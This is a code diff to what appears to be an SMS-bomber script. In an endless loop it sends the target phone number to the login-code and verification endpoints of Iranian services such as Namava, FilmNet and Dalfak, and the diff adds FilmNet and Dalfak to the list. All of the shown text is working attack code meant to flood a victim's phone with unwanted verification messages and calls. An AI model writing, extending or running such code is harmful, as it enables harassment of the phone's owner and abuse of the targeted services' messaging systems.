@@ -328,6 +328,20 @@ while True:
     namava_req = requests.post(namava_url, json=namava_payload, headers=rhead)
     print('Namava: '+str(namava_req.status_code))
 
+    # FilmNet
+    filmnet_url = f'https://filmnet.ir/api-v2/access-token/users/0{number}/otp'
+    filmnet_req = requests.get(filmnet_url, json=rhead)
+    print('FilmNet: ' + str(filmnet_req.status_code))
+
+    # Dalfak
+    dalfak_url = 'https://www.dalfak.com/api/auth/sendVerificationCode'
+    dalfak_payload = {
+        'type': 1,
+        'value': '0'+number
+    }
+    dalfak_req = requests.post(dalfak_url, json=dalfak_payload, headers=rhead)
+    print('dalfak: '+str(dalfak_req.status_code))
+
     ### Call APIs ###
 
     # DigikalaCall
